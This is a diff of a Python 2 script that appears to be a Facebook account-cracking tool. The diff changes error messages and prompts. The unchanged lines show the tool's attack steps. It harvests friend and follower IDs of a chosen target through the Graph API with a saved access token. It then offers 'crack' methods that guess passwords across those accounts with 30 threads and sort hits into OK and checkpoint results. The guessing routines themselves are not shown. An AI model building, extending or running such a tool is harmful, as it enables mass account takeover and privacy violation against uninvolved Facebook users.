@@ -110,7 +110,7 @@ def login():
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
-			exit("[?] Login Error")
+			exit("[?] Token Expired")
 
 # Menu Raka Andrian Tara
 def menu():
@@ -120,12 +120,12 @@ def menu():
 		token = open("login.txt","r").read()
 	except KeyError:
 		os.system("rm -f login.txt")
-		exit("[?] Login Error")
+		exit("[?] Token Expired")
 	try:
 		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
 	except IOError:
 		os.system("rm -f login.txt")
-		exit("\033[1;96m[\033[1;93m+\033[1;96m] Token Error")
+		exit("\033[1;96m[\033[1;93m+\033[1;96m] Token Expired")
 	except requests.exceptions.ConnectionError:
 		exit(" ! no internet connection")
 
@@ -140,9 +140,9 @@ def menu():
 	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Multi cracking from public Id\033[1;97m [ \033[1;95mPro \033[1;97m]")
 	print("\033[1;96m[\033[1;93m4\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Check crack results")
 	print("\033[1;96m[\033[1;93m5\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m User-agent settings \033[1;97m [ \033[1;95mPro \033[1;97m]")
-	print("\033[1;96m[\033[1;93m6\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Exit\033[1;97m [ \033[1;91mRemove-Token \033[1;97m]")
+	print("\033[1;96m[\033[1;93m6\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Exit\033[1;97m [ \033[1;91mRemove-Token \033[1;97m]\n")
 		
-	Bilal = raw_input("\033[1;96m[\033[1;93m+\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Option : ")
+	Bilal = raw_input("\033[1;96m[\033[1;93m•\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Option : ")
 	if Bilal =="":
 		menu()
 	elif Bilal == "1" or Bilal == "01":
@@ -157,7 +157,7 @@ def menu():
 	elif Bilal == "4" or Bilal == "04":
 		print(" ")
 		print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Check results RAKA_AMANDA OK")
-		print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Check results RAKA_AMANDA CP")
+		print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Check results RAKA_AMANDA CP\n")
 		print(" ")
 		cek = raw_input("\033[1;96m[\033[1;93m+\033[1;96m] \033[1;92mAngga \033[1;96m™\033[1;97m Option  : ")
 		if cek =="":
@@ -207,7 +207,7 @@ def publik():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Error")
+		exit("\n\033[1;96m[\033[1;93m!\033[1;96m] Token Expired")
 	idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id       : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
@@ -223,7 +223,7 @@ def follower():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
+		exit("\n\033[1;96m[\033[1;94m+\033[1;96m] Token Expired")
 	idt = raw_input("\033[1;93m◍➤\033[1;97m Target Id       : ")
 	try:
 		for i in requests.get("https://graph.facebook.com/%s/subscribers?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
@@ -239,7 +239,7 @@ def massal():
 	try:
 		token = open("login.txt", "r").read()
 	except IOError:
-		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Error")
+		exit("\033[1;96m[\033[1;94m+\033[1;96m] Token Expired")
 	try:
 		tanya_Total = int(input("\033[1;93m◍➤\033[1;97m Enter Multiple ID Option : "))
 	except:tanya_Total=1
@@ -259,26 +259,26 @@ def method():
 	print("\033[1;93m◍➤\033[1;97m Choose Crack Methode [ \033[1;92mRecommended B-API \033[1;97m]")
 	print("\033[1;96m[\033[1;93m1\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mB-API\033[1;97m [ \033[1;95mFast \033[1;97m]")
 	print("\033[1;96m[\033[1;93m2\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mM-Basic\033[1;97m [ \033[1;95mFast \033[1;97m]")
-	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mFree Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]")
+	print("\033[1;96m[\033[1;93m3\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mFree Facebook\033[1;97m [ \033[1;95mNormal \033[1;97m]\n")
 	method = raw_input("\033[1;96m[\033[1;93m+\033[1;96m] \033[1;92mAngga \033[1;96m™ \033[1;97mOption : ")
 	if method == "":
 		menu()
 	elif method == "1":
-		ask = raw_input("\033[1;93m◍➤\033[1;97m Do You Choose Manual Passwors? y/t\033[1;97m [ \033[1;92mDefault: t\033[1;97m ] : ")
+		ask = raw_input("\033[1;93m◍➤\033[1;97m Do You Choose Manual Passwors? y/t : ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(bapi, id)
 		exit("Program End")
 	elif method == "2":
-		ask = raw_input("\033[1;93m◍➤\033[1;97m Do You Choose Manual passwords? y/t\033[1;97m [ \033[1;92mDefault: t\033[1;97m ] ")
+		ask = raw_input("\033[1;93m◍➤\033[1;97m Do You Choose Manual passwords? y/t : ")
 		if ask == "y":
 			manual()
 		print(" ")
 		ThreadPool(30).map(mbasic, id)
 		exit("Program End")
 	elif method == "3":
-		ask = raw_input("\033[1;93m◍➤\033[1;97m Do You Choose Manual passwords? y/t\033[1;97m [ \033[1;92mDefault: t\033[1;97m ] ")
+		ask = raw_input("\033[1;93m◍➤\033[1;97m Do You Choose Manual passwords? y/t : ")
 		if ask == "y":
 			manual()
 		print(" ")
